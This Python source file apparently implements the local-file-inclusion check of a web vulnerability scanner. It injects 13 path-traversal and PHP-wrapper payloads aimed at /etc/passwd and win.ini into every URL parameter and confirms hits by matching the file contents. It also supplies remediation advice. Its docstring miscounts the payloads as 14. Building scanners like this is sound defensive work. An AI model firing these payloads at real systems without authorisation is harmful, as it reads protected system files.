"""LFI / Path Traversal scanner.

Zero-FP via file-content marker detection:
  Linux /etc/passwd     -> "root:x:0:0:" pattern
  Windows win.ini       -> "[boot loader]" / "[fonts]" sections
  PHP filter base64     -> base64-decode then check passwd marker

14 payload variants (relative, absolute, URL-encoded, double-encoded,
nested, PHP wrappers, null-byte, Windows paths).
"""
import base64
import re
import urllib.parse
from fastapi import APIRouter, Depends

from tools._shared import (
    ScanRequest, verify_scan_quota, web_url,
    safe_get, wrap_finding, standard_response,
)

router = APIRouter()


LFI_PAYLOADS = [
    ("Linux passwd (3 levels)",  "../../../etc/passwd",                        "passwd"),
    ("Linux passwd (5 levels)",  "../../../../../etc/passwd",                  "passwd"),
    ("Linux passwd (8 levels)",  "../../../../../../../../etc/passwd",         "passwd"),
    ("Linux passwd (absolute)",  "/etc/passwd",                                "passwd"),
    ("Linux passwd (URL-encoded)", "..%2F..%2F..%2Fetc%2Fpasswd",              "passwd"),
    ("Linux passwd (double-encoded)", "..%252F..%252F..%252Fetc%252Fpasswd",   "passwd"),
    ("Linux passwd (nested)",    "....//....//....//etc/passwd",               "passwd"),
    ("PHP filter b64 passwd",    "php://filter/convert.base64-encode/resource=/etc/passwd", "passwd_b64"),
    ("Null-byte passwd",         "../../../etc/passwd%00",                     "passwd"),
    ("Null-byte passwd .jpg",    "../../../etc/passwd%00.jpg",                 "passwd"),
    ("Windows win.ini",          "../../../windows/win.ini",                   "win_ini"),
    ("Windows win.ini (\\)",     "..\\..\\..\\windows\\win.ini",               "win_ini"),
    ("Windows win.ini (absolute)", "C:\\windows\\win.ini",                     "win_ini"),
]


MARKERS = {
    "passwd":  re.compile(r"root:[^:]*:0:0:", re.M),
    "win_ini": re.compile(r"\[(?:boot loader|fonts|extensions|operating systems)\]", re.I),
}


def _inject_param(url, param, value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_qs = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_qs))


def _check_response(body, marker_type):
    if not body:
        return False
    if marker_type == "passwd":
        return bool(MARKERS["passwd"].search(body))
    if marker_type == "win_ini":
        return bool(MARKERS["win_ini"].search(body))
    if marker_type == "passwd_b64":
        for m in re.finditer(r"[A-Za-z0-9+/=]{40,}", body):
            try:
                decoded = base64.b64decode(m.group(0), validate=False).decode("utf-8", errors="ignore")
                if MARKERS["passwd"].search(decoded):
                    return True
            except Exception:
                continue
    return False


@router.post("/api/scan/lfi")
async def scan_lfi(req: ScanRequest, _=Depends(verify_scan_quota)):
    url = web_url(req.target)
    findings = []
    tests = 0
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    if not qs:
        return standard_response(
            tool="lfi", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason="No URL parameters present — append ?page=index (or similar) to test",
        )

    raw_results = []
    for param, _orig in qs.items():
        tests += 1
        confirmed = None
        for variant, payload, marker_type in LFI_PAYLOADS:
            test_url = _inject_param(url, param, payload)
            r = safe_get(test_url, req=req, allow_redirects=True, timeout=10)
            if r is None or r.status_code >= 500:
                continue
            if _check_response(r.text or "", marker_type):
                confirmed = {"variant": variant, "payload": payload,
                             "marker": marker_type, "status_code": r.status_code}
                break

        if confirmed:
            file_read = "/etc/passwd" if "passwd" in confirmed["marker"] else "windows/win.ini"
            findings.append(wrap_finding(
                f"Local File Inclusion in parameter '{param}' — read {file_read}",
                "CRITICAL", cwe="CWE-22", owasp="A01:2021",
                evidence_marker=f"payload `{confirmed['payload'][:80]}` returned HTTP {confirmed['status_code']} with file content marker matching {confirmed['marker']} ({confirmed['variant']})",
                remediation="NEVER pass user input directly to file APIs. Validate against an allow-list of permitted files. Disable PHP wrappers (allow_url_include=Off). Use chroot or container isolation as defense-in-depth.",
                tests_performed=1,
                cvss="9.8",
            ))
            raw_results.append({"param": param, "result": "VULNERABLE", **confirmed})
        else:
            raw_results.append({"param": param, "result": "safe"})

    return standard_response(
        tool="lfi", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=f"Tested {tests} parameter(s) with {len(LFI_PAYLOADS)} LFI variants each, verified via file-content marker match",
        raw_data={"lfi": {"params_tested": tests, "vulnerable_count": len(findings), "results": raw_results}},
    )


def register(app):
    app.include_router(router)
